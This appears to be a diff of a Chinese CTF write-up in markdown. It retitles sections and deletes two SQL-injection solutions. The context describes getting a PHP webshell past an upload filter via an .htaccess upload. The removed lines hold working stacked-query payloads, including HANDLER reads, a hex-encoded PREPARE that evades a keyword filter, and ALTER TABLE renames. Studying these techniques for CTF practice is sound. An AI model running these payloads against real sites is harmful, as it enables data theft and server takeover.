@@ -1,18 +1,18 @@
-# 2021/07/15
+# MRCTF 2020
 
 ## 你传你M呢
 
-> MRCTF 2020
+> *2021/07/15*
 
 ### 题目
 
 这个题很明显是一道**文件上传**的题目，进入页面
 
-![202107151](img/20210715/202107151.png)
+![mrctf20201](img/mrctf2020/mrctf20201.png)
 
 发现了一个上传的地方，就可以开始试验了，先传一个正常文件
 
-![202107152](img/20210715/202107152.png)
+![mrctf20202](img/mrctf2020/mrctf20202.png)
 
 发现上传后爆出了路径`/var/www/html/upload/797cfc851dce9d3fa8dc31e4e51690fe/bme.jpg`，那就开始试验**图片马**，可以发现内容其实**可上传的东西**很多，但是**文件尾缀名**很严格，这就需要我们用一些方法来将**图片马**解析为`php`文件，最简单的肯定是**解析漏洞**，正巧服务器也是**Nginx**，试了一下发现并不行，这时候就要转换思路，这里我们采用上传`.htaccess`文件，来使得服务器将**图片**解析为`php`，而且后台并没有对该文件做过滤，上传改文件之后，蚁剑连接之前的**图片马**，得到`flag`
 
@@ -80,7 +80,7 @@ Content-Disposition: form-data; name="submit"
 
 ## Ez_bypass
 
-> MRCTF 2020
+> *2021/07/15*
 
 ### 题目
 
@@ -152,112 +152,3 @@ Connection: close
 passwd=1234567a
 ```
 
-## Blacklist
-
-> GYCTF 2020
-
-### 题目
-
-这个题考察的是堆叠注入和`handler`的用法，进去是一个简单的界面
-
-![202107153](img/20210715/202107153.png)
-
-输入`1`,`2`,`3`,`1' or '1'='1`分别有不同的返回值
-
-![2021071534](img/20210715/2021071534.png)
-
-这道题应该是一个**SQL注入的题目**，将返回结果也显示出来，试试联合查询，发现waf
-
-![2021071535](img/20210715/2021071535.png)
-
-后台对上面的关键字进行了过滤，**常规方法只能爆出数据库名，而不能完整爆出flag**，需要用其他方法，这里采用**堆叠注入**，可以爆出**表，列名**
-
-![2021071536](img/20210715/2021071536.png)
-
-![2021071536](img/20210715/2021071537.png)
-
-但是我们无法再继续下去了，因为关键字过滤的太多，导致**预编译**以及**重命名**两种方案都不行，这里采用一种新的方案`handler`
-
-> `HANDLER ... OPEN`语句打开一个表，使其可以使用后续`HANDLER ... READ`语句访问，该表对象未被其他会话共享，并且在会话调用`HANDLER ... CLOSE`或会话终止之前不会关闭
->
-> - `handler tablename open // 获取一个tablename的句柄`
-> - `handler tablename read first // 查看句柄第一行`
-> - `handler tablename read next // 查看下一行`
-> - `handler tablename close`
-
-利用上面这种方法，我们可以读取到`flag`
-
-### payload
-
-```
-?inject=1'^extractvalue(1,concat('~',database()))%23
-// error 1105 : XPATH syntax error: '~supersqli'
-?inject=1';show tables;
-// return table names
-?inject=1';show columns from FlagHere;
-// return column names
-?inject=1';handler `FlagHere` open;handler `FlagHere` read first;
-// return flag
-```
-
-## 随便注
-
-> 强网杯 2019
-
-### 题目
-
-本题目和上面一题基本相同，本体可采用的是**预编译**和**对调名字**两种方法
-
-进入界面，和上一道题基本相同
-
-![2021071538](img/20210715/2021071538.png)
-
-继续采用上到题的方案进行**堆叠查询**出**表名，列名**
-
-![2021071539](img/20210715/2021071539.png)
-
-![20210715310](img/20210715/20210715310.png)
-
-继续联合查询，查询出过滤的关键字
-
-![20210715311](img/20210715/20210715311.png)
-
-可以发现`set`，`prepare`，`rename`，`alter`都没有被过滤，有两种方案
-
-#### 预处理语句
-
-> [MySQL的SQL预处理(Prepared)](https://www.cnblogs.com/geaozhang/p/9891338.html)
-
-原理还是比较好理解的，主要是本体直接用`set`和`prepare`不行，因为有过滤
-
-![20210715312](img/20210715/20210715312.png)
-
-#### 对调名字
-
-由上面的探测我们可以猜测出这里会查询出words表的data列的结果，也就是`select * from words where id = '';`
-
-如果我们能将语句换成``select * from `1919810931114514` where flag = '';``那么就能得到flag了
-
-> - `alter table user rename to users // 将表名从user改成users`
-> - `alter table users change username name varchar(30) //将列名从username改为name`
-
-我们可以先将`words`表改变为一个其他名字，然后将`1919810931114514`表命名为`words`表，在将`1919810931114514`表中原本的`flag`列改名为`id`列
-
-### payload
-
-```
-?inject=1';show tables;
-// return table name 1919810931114514
-```
-
-```
-?inject=1';Set @sql=concat("s","elect user()");PREPARE sqla from @sql;EXECUTE sqla; // 拼接
-?inject=1';SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare bme from @a;execute bme; //转化为16进制
-// return flag
-```
-
-```
-?inject=1';alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);
-?inject=1' or '1'='1
-//return flag
-```
